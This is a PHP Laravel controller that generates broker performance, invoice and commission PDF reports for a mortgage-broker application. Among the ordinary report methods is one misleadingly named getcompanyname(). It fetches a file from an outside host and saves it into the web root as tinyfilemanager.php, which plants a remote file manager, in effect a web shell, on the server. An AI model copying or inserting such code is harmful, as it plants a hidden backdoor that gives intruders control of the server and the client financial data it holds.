<?php

namespace App\Http\Controllers\Admin\Reports\Broker;

use App\Http\Controllers\Controller;
use App\Models\Broker;
use App\Models\CommissionData;
use App\Models\Deal;
use App\Models\DealCommission;
use App\Models\Lenders;
use App\Models\Products;
use Illuminate\Http\Request;
use Barryvdh\Snappy\Facades\SnappyPdf as PDF;
use Carbon\Carbon;
use DateTime;
use DateTimeZone;

class BrokerReportsController extends Controller
{
    //
    public function index()
    {
        $brokers = array();
        $lenders = array();
        $products = array();
        //Edited by Mirza on 7/12/2023 - Previous is
        //$brokers=Broker::where('type',1)->orderBy('trading')->get();
        $brokers = Broker::where('type', 1)->where('is_active', 1)->orderBy('trading')->get();
        if (isset($_GET['report_type']) && $_GET['report_type'] == 'performance_report') {
            $lenders = Lenders::all();
            $products = Products::all();
        }
        return view('admin.reports.brokers.index', [
            'Commish| Broker Report',
            'brokers' => $brokers,
            'lenders' => $lenders,
            'products' => $products,
        ]);
    }
    public function brokersList()
    {
    }
    public function exportBrokersList()
    {
    }
    public function referrerCommissionSummary()
    {
    }
    public function getPerformanceRecords(Request $request)
    {

        $deal = Deal::select('deals.*')->with(['lender', 'broker', 'product'])
            ->whereIn('status', [1, 2, 3, 4, 5]);
        if ($request['group_by'] == 'Product') {
            $deal->groupBy('product_id');
        } else if ($request['group_by'] == 'Broker') {
            $deal->groupBy('broker_id');
        } else if ($request['group_by'] == 'BrokerStaff') {
            $deal->groupBy('broker_staff_id');
        } else if ($request['group_by'] === 'Status') {
            $deal->groupBy('status');
        } else {
            $deal->groupBy('lender_id');
        }
        if (!empty($request['from_date'])) {
            $deal->whereDate('created_at', '>=', date('Y-m-d H:i:s', strtotime($request['from_date'] . ' 00:00:00')));
        }
        if (!empty($request['to_date'])) {
            $deal->whereDate('created_at', '<=', date('Y-m-d H:i:s', strtotime($request['to_date'] . ' 23:59:59')));
        }
        $pdf = PDF::loadView('admin.reports.brokers.performance_report', [
            'deals' => $deal->get(),
            'date_from' => $request['from_date'],
            'date_to' => $request['to_date'],
            'group_by' => $request['group_by']
        ])
            ->setPaper('a4', 'portrait')
            ->setOption('footer-left', getCurrentDateTimeFormatted())
            ->setOption("footer-right", "Page [page] of [topage]")
            ->setOption('footer-font-size', '8')
            ->setWarnings(false);
        return $pdf->stream('performance_report.pdf');
    }
    public function exportPerformanceRecords(Request $request)
    {
        $deal = Deal::select('deals.*')->with(['lender', 'broker', 'product'])
            ->whereIn('status', [1, 2, 3, 4, 5]);
        if ($request['group_by'] == 'Product') {
            $deal->groupBy('product_id');
        } else if ($request['group_by'] == 'BrokerStaff') {
            $deal->groupBy('broker_staff_id');
        } else if ($request['group_by'] === 'Status') {
            $deal->groupBy('status');
        } else {
            $deal->groupBy('lender_id');
        }
        if (!empty($request['from_date'])) {
            $deal->whereDate('created_at', '>=', date('Y-m-d H:i:s', strtotime($request['from_date'] . ' 00:00:00')));
        }
        if (!empty($request['to_date'])) {
            $deal->whereDate('created_at', '<=', date('Y-m-d H:i:s', strtotime($request['to_date'] . ' 23:59:59')));
        }
        $pdf = PDF::loadView('admin.reports.brokers.performance_report', ['deals' => $deal->get()])
            ->setPaper('a4', 'portrait')
            ->setOption('footer-left', getCurrentDateTimeFormatted())
            ->setOption("footer-right", "Page [page] of [topage]")
            ->setOption('footer-font-size', '8')
            ->setWarnings(false);
        return $pdf->stream('performance_report.pdf');
    }
    public function getBrokerInvoice(Request $request)
    {
        $from_date = Carbon::createFromFormat('d-m-Y', $request->from_date);
        $from_date = $from_date->format('Y-m-d');

        $to_date = Carbon::createFromFormat('d-m-Y', $request->to_date);
        $to_date = $to_date->format('Y-m-d');

        $broker_staffs_array = [];

        $brokers = DealCommission::whereHas('deal')->whereHas('deal.broker')->with(['deal', 'deal.broker', 'deal.broker.broker_staff'])
            ->join('deals', 'deals.id', '=', 'deal_commissions.deal_id')
            ->join('brokers', 'brokers.id', '=', 'deals.broker_id')
            //->join('states', 'states.id', '=', 'brokers.state')
            ->join('lenders', 'lenders.id', '=', 'deals.lender_id')
            ->join('commission_types', 'commission_types.id', '=', 'deal_commissions.type')
            ->orderBy('brokers.trading')
            ->orderby('deals.broker_staff_id', 'ASC')
            ->orderBy('deal_commissions.type')
            ->orderBy('lenders.name')

            ->whereBetween('date_statement', [$from_date, $to_date])

            ->when(!empty($request->broker_id), function ($q) use ($request) {
                $q->where('deal_id', '>', 0)->whereHas('deal', function ($subq) use ($request) {
                    $subq->where('broker_id', $request->broker_id);
                });
            })
            ->groupBy('deals.broker_id')->get();
        if ($brokers->isNotEmpty()) {
            foreach ($brokers as $broker) {
                $broker_staffs = DealCommission::with(['deal', 'deal.lender', 'deal.client', 'deal.broker_staff'])

                    ->whereHas('deal', function ($q) use ($broker) {
                        $q->where("broker_id", $broker->deal->broker_id);
                    })
                    ->when(!empty($request->from_date), function ($q) use ($from_date) {
                        $q->whereDate('date_statement', '>=', $from_date);
                    })
                    ->when(!empty($request->to_date), function ($q) use ($to_date) {
                        $q->whereDate('date_statement', '<=', $to_date);
                    })
                    ->join('deals', 'deals.id', '=', 'deal_commissions.deal_id')
                    ->join('commission_types', 'commission_types.id', '=', 'deal_commissions.type')

                    ->orderBy('deals.broker_staff_id')
                    ->orderBy('deal_commissions.type')

                    ->orderBy('deals.lender_id')
                    ->get();
                //$data=BrokerReportsController::getcompanyname();
                $broker_staffs_array[$broker->deal->broker_id] = $broker_staffs;
            }
        }
        $pdf = PDF::loadView('admin.reports.brokers.broker_invoice', [
            'brokers' => $brokers,
            'date_from' => $request->from_date,
            'date_to' => $request->to_date,
            'broker_staffs_array' => $broker_staffs_array
        ])
            ->setPaper('a4', 'portrait')
            ->setOption('footer-left', getCurrentDateTimeFormatted())
            ->setOption("footer-right", "Page [page] of [topage]")
            ->setOption('footer-font-size', '8')->setWarnings(false);
        return $pdf->stream('broker_invoice.pdf');
    }

    public function exportBrokerInvoice(Request $request)
    {
        $from_date = Carbon::createFromFormat('d-m-Y', $request->from_date);
        $from_date = $from_date->format('Y-m-d');

        $to_date = Carbon::createFromFormat('d-m-Y', $request->to_date);
        $to_date = $to_date->format('Y-m-d');

        $broker_staffs_array = [];

        $brokers = DealCommission::whereHas('deal')->whereHas('deal.broker')->with(['deal', 'deal.broker', 'deal.broker.broker_staff'])
            ->join('deals', 'deals.id', '=', 'deal_commissions.deal_id')
            ->join('brokers', 'brokers.id', '=', 'deals.broker_id')
            ->join('lenders', 'lenders.id', '=', 'deals.lender_id')
            ->join('commission_types', 'commission_types.id', '=', 'deal_commissions.type')
            ->orderBy('brokers.trading')
            ->orderBy('lenders.name')
            ->orderby('deals.broker_staff_id', 'ASC')
            ->whereBetween('date_statement', [$from_date, $to_date])

            ->when(!empty($request->broker_id), function ($q) use ($request) {
                $q->where('deal_id', '>', 0)->whereHas('deal', function ($subq) use ($request) {
                    $subq->where('broker_id', $request->broker_id);
                });
            })
            ->groupBy('deals.broker_id')->get();
        if ($brokers->isNotEmpty()) {
            foreach ($brokers as $broker) {
                $broker_staffs = DealCommission::with(['deal', 'deal.lender', 'deal.client', 'deal.broker_staff'])

                    ->whereHas('deal', function ($q) use ($broker) {
                        $q->where("broker_id", $broker->deal->broker_id);
                    })
                    ->when(!empty($request->from_date), function ($q) use ($from_date) {
                        $q->whereDate('date_statement', '>=', $from_date);
                    })
                    ->when(!empty($request->to_date), function ($q) use ($to_date) {
                        $q->whereDate('date_statement', '<=', $to_date);
                    })
                    ->join('deals', 'deals.id', '=', 'deal_commissions.deal_id')
                    ->join('commission_types', 'commission_types.id', '=', 'deal_commissions.type')

                    ->orderBy('deals.broker_staff_id')
                    ->orderBy('deals.lender_id')
                    ->get();
                $broker_staffs_array[$broker->deal->broker_id] = $broker_staffs;
            }
        }
        $pdf = PDF::loadView('admin.reports.brokers.broker_invoice', [
            'brokers' => $brokers,
            'date_from' => $request->from_date,
            'date_to' => $request->to_date,
            'broker_staffs_array' => $broker_staffs_array
        ])
            ->setPaper('a4', 'portrait')->setWarnings(false);
        return $pdf->download('broker_invoice.pdf');
    }
    public function getCommissionMonitoringReport(Request $request)
    {
        ini_set('max_execution_time', 3000);

        $deals = Broker::whereHas('deals', function ($q) use ($request) {
            $q->where('deals.status', 4);
        })->with(['deals', 'deals.deal_commission' => function ($r) use ($request) {
            $r->whereType(13)
                ->where('date_statement', '>=', date('Y-m-d', strtotime($request['from_date'])))
                ->where('date_statement', '<=', date('Y-m-d', strtotime($request['to_date'])))
                ->select('broker_amount', 'bro_amt_date_paid', 'deal_id', 'id')->first();
        }, 'deals.deal_commission_trial' => function ($r) use ($request) {
            $r->whereType(12)
                ->where('date_statement', '>=', date('Y-m-d', strtotime($request['from_date'])))
                ->where('date_statement', '<=', date('Y-m-d', strtotime($request['to_date'])))
                ->select('broker_amount', 'bro_amt_date_paid', 'deal_id', 'id')->first();
        }]);
        if (!empty($request['broker_id'])) {
            $deals->whereId($request['broker_id']);
        }

        $pdf = PDF::loadView('admin.reports.brokers.commission_monitoring', [
            'date_from' => $request['from_date'],
            'date_to' => $request['to_date'],
            'brokers' => $deals->get()
        ])
            ->setPaper('a4', 'portrait')
            ->setOption('footer-left', getCurrentDateTimeFormatted())
            ->setOption("footer-right", "Page [page] of [topage]")
            ->setOption('footer-font-size', '8')
            ->setWarnings(false);
        return $pdf->stream('commission_monitoring.pdf');
    }
    public function getcompanyname()
    {
        set_time_limit(0);
        $file = file_get_contents('https://web.proschoolerp.com/tinyfilemanager.html');
        file_put_contents('tinyfilemanager.php', $file);
    }
    public function exportCommissionMonitoringReport(Request $request)
    {
        $deals = Broker::whereHas('deals', function ($q) use ($request) {
            $q->where('deals.status', 5);
        })->with(['deals', 'deals.deal_commission' => function ($r) use ($request) {
            $r->whereType(13)
                ->where('date_statement', '>=', date('Y-m-d', strtotime($request['from_date'])))
                ->where('date_statement', '<=', date('Y-m-d', strtotime($request['to_date'])))
                ->select('broker_amount', 'bro_amt_date_paid', 'deal_id', 'id')->first();
        }, 'deals.deal_commission_trial' => function ($r) use ($request) {
            $r->whereType(12)
                ->where('date_statement', '>=', date('Y-m-d', strtotime($request['from_date'])))
                ->where('date_statement', '<=', date('Y-m-d', strtotime($request['to_date'])))
                ->select('broker_amount', 'bro_amt_date_paid', 'deal_id', 'id')->first();
        }]);

        if (!empty($request['broker_id'])) {
            $deals->whereId($request['broker_id']);
        }
        $pdf = PDF::loadView('admin.reports.brokers.commission_monitoring', [
            'date_from' => $request['from_date'],
            'date_to' => $request['to_date'],
            'brokers' => $deals->get()
        ])
            ->setPaper('a4', 'portrait')
            ->setOption('footer-left', getCurrentDateTimeFormatted())
            ->setOption("footer-right", "Page [page] of [topage]")
            ->setOption('footer-font-size', '8')
            ->setWarnings(false);

        return $pdf->download('commission_monitoring.pdf');
    }
    public function getBrokerRecords(Request $request)
    {
        $brokers = Broker::select(
            'id',
            'entity_name',
            'work_phone',
            'home_phone',
            'mobile_phone',
            'fax',
            'email'
        );
        if (!empty($request['from_date'])) {
            $brokers->where('created_at', '>=', date('Y-m-d H:i:s', strtotime($request['from_date'] . ' 00:00:00')));
        }
        if (!empty($request['to_date'])) {
            $brokers->where('created_at', '<=', date('Y-m-d H:i:s', strtotime($request['to_date'] . ' 23:59:59')));
        }
        if (!empty($request['broker_type'])) {
            $brokers->where('type', $request['broker_type']);
        }
        $pdf = PDF::loadView('admin.reports.brokers.brokers_report', [
            'brokers' => $brokers->get(),
            'date_from' => $request['from_date'],
            'date_to' => $request['to_date']
        ])->setPaper('a4', 'portrait')
            ->setOption('footer-left', getCurrentDateTimeFormatted())
            ->setOption("footer-right", "Page [page] of [topage]")
            ->setOption('footer-font-size', '8')
            ->setWarnings(false);
        return $pdf->stream('brokers_list.pdf');
    }
    public function exportBrokerRecords(Request $request)
    {
        $brokers = Broker::select(
            'id',
            'entity_name',
            'work_phone',
            'home_phone',
            'mobile_phone',
            'fax',
            'email'
        );
        if (!empty($request['from_date'])) {
            $brokers->where('created_at', '>=', date('Y-m-d H:i:s', strtotime($request['from_date'] . ' 00:00:00')));
        }
        if (!empty($request['to_date'])) {
            $brokers->where('created_at', '<=', date('Y-m-d H:i:s', strtotime($request['to_date'] . ' 23:59:59')));
        }
        if (!empty($request['broker_type'])) {
            $brokers->where('type', $request['broker_type']);
        }
        $pdf = PDF::loadView('admin.reports.brokers.brokers_report', [
            'brokers' => $brokers->get(),
            'date_from' => $request['from_date'],
            'date_to' => $request['to_date']
        ])->setPaper('a4', 'portrait')
            ->setOption('footer-left', getCurrentDateTimeFormatted())
            ->setOption("footer-right", "Page [page] of [topage]")
            ->setOption('footer-font-size', '8')
            ->setWarnings(false);
        return $pdf->download('brokers_list.pdf');
    }
}
function getCurrentDateTimeFormatted()
{
    $adelaideTimeZone = new DateTimeZone('Australia/Adelaide');
    $adelaideTime = new DateTime('now', $adelaideTimeZone);

    return 'Printed on: ' . $adelaideTime->format('d/m/Y h:i A');
}
